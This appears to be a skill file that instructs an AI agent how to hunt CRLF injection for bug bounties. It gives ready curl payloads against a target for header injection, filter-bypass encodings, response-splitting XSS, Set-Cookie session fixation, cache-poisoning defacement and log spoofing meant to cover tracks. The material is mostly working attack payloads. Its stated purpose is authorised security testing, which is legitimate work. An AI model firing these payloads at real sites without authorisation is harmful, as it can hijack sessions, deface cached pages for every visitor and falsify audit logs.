---
name: hunt-crlf
description: "Hunt CRLF injection — HTTP response header injection, response splitting, XSS via injected body, cache poisoning via split response, Set-Cookie injection, log poisoning. Use when user input is reflected in HTTP response headers (Location, Set-Cookie, custom headers) or log files."
---

## Decision tree

| You see | Do once | Proves |
|---|---|---|
| Input reflected in `Location` header (redirect) | `%0d%0aX-Injected:true` appended to redirect param | `X-Injected: true` appears in response headers |
| Input reflected in `Set-Cookie` header | `%0d%0aSet-Cookie:hijacked=1` | Extra cookie set in browser |
| Input reflected in any custom response header | `%0d%0a%0d%0a<script>alert(document.domain)</script>` | XSS fires (response body injected) |
| Input logged to server logs (visible in admin panel) | `%0d%0aFake-Log-Entry: admin logged in` | Fake entry appears in log viewer |

## Header injection

The core payload: `%0d%0a` (CRLF = `\r\n`) terminates the current header and starts a new one.

```bash
# Test on redirect parameter
curl -sI "https://$TARGET/redirect?url=https://example.com%0d%0aX-Injected:CRLF-RAND"

# Test on language/locale parameter reflected in headers
curl -sI "https://$TARGET/?lang=en%0d%0aX-Injected:CRLF-RAND"

# Test on callback/JSONP parameter
curl -sI "https://$TARGET/api/data?callback=func%0d%0aX-Injected:CRLF-RAND"
```

Check the response headers. If `X-Injected: CRLF-RAND` appears, header injection is confirmed.

## Encoding variants

| Encoding | Payload |
|---|---|
| URL-encoded | `%0d%0a` |
| Double URL-encoded | `%250d%250a` |
| Unicode | `%E5%98%8A%E5%98%8D` (UTF-8 encoding of U+560A U+560D) |
| Bare CR only | `%0d` (some servers normalize CR to CRLF) |
| Bare LF only | `%0a` (Node.js HTTP parser accepts LF alone) |
| Null byte prefix | `%00%0d%0a` (bypass WAF/filter) |

Try each variant — different servers parse differently.

## Response splitting (XSS)

Double CRLF (`%0d%0a%0d%0a`) terminates headers and starts response body:

```bash
curl -sI "https://$TARGET/redirect?url=x%0d%0a%0d%0a<script>alert(document.domain)</script>"
```

If the response body contains your script and the browser renders it, that's XSS via CRLF.

Realistic payload for Set-Cookie injection:
```bash
curl -sI "https://$TARGET/login?next=/dashboard%0d%0aSet-Cookie:session=attacker_token;Path=/;HttpOnly"
```

## Cache poisoning via response splitting

If a caching proxy (CDN, Varnish, Nginx) sits in front:

```bash
# Inject a second response into the stream
curl -s "https://$TARGET/redirect?url=x%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>Cached%20Defacement</h1>"
```

The proxy may cache the injected second response for the next visitor. Verify by requesting the same URL from a different session.

## Log injection

If user input appears in server logs (access logs, audit logs, admin panel):

```bash
curl "https://$TARGET/api/search?q=test%0d%0a[CRITICAL]%20Admin%20password%20reset%20by%20attacker"
```

Impact: log spoofing, covering tracks, injecting misleading audit entries. Lower severity than header injection but still reportable if admin panel renders logs without sanitization (can chain to stored XSS).

## Common injection points

- `Location` header redirects (`?redirect=`, `?next=`, `?url=`, `?return=`)
- `Set-Cookie` values derived from user input
- `Content-Disposition` filename (`?filename=report%0d%0a...`)
- Custom headers reflecting request params (e.g., `X-Request-ID` from query)
- CORS `Access-Control-Allow-Origin` reflecting `Origin` header value

## Validation

- **Header injection**: the injected header (`X-Injected: CRLF-RAND`) appears in the raw HTTP response headers. Use `curl -sI` or Burp to inspect.
- **XSS via splitting**: the injected script executes in browser with `alert(document.domain)`. Screenshot it.
- **Cookie injection**: the injected `Set-Cookie` is accepted by the browser (check DevTools → Application → Cookies).
- **Cache poisoning**: a clean request (no CRLF payload) from a different session returns the poisoned content.

A `%0d%0a` in the response BODY (HTML-encoded or raw) is NOT header injection — it must appear in the actual HTTP headers before the body separator.

## Chains

- Header injection + `Set-Cookie` → `hunt-session` (session fixation)
- Response splitting + XSS → `hunt-xss` (reflected XSS via CRLF)
- Cache poisoning → `hunt-cache-poison` (persistent defacement or XSS for all visitors)
- Log injection + admin panel XSS → `hunt-xss` (stored XSS via log viewer)

## Before you report — dedup gate

```bash
python3 engine/dedup.py check --program <program> --class crlf --url "<endpoint>" --title "<title>"
```

`NOVEL` → `/validate`. `LIKELY_DUP` → stop. Draft only — do not submit.

Cross-refs: `hunt-xss`, `hunt-cache-poison`, `hunt-open-redirect`, `hunt-session`.
